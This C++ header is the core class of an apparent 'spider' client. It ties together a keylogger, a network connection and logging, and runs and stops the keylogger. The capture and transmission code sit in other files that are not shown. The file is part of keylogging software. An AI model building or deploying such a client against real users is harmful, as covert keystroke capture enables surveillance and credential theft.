//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
#define SPIDER_CLIENT_CSPIDERCORE_HPP

#include "KeyLogger.hpp"
#include "Connection.hpp"
#include "KeyLoggerFactory.hpp"
#include "LogHandle.hpp"

#define SPIDER_LOG utl::LightRed << "{'client-spider'}" << utl::Reset

namespace spi
{
    class CSpiderCore
    {
    public:
        CSpiderCore() = default;
        ~CSpiderCore()
        {
            _keyLogger->stop();
            _log(lg::Info) << SPIDER_LOG << " shutdown ..." << std::endl;
        }
    public:
        bool run()
        {
            __setup();
            _log(lg::Info) << SPIDER_LOG << " running ..." << std::endl;
            _keyLogger->run();
            return true;
        }

    private:
        void __setup()
        {
            _logHandle.setup();
            _clientSocket.setup();
            _keyLogger->setup();
        }

    private:
        Connection _clientSocket;
        LogHandle _logHandle;
        KeyLogPtr _keyLogger{Factory::createKeyLogger(_logHandle)};
        lg::Logger _log{"client-spider", lg::Level::Debug};
    };
}

#endif //SPIDER_CLIENT_CSPIDERCORE_HPP
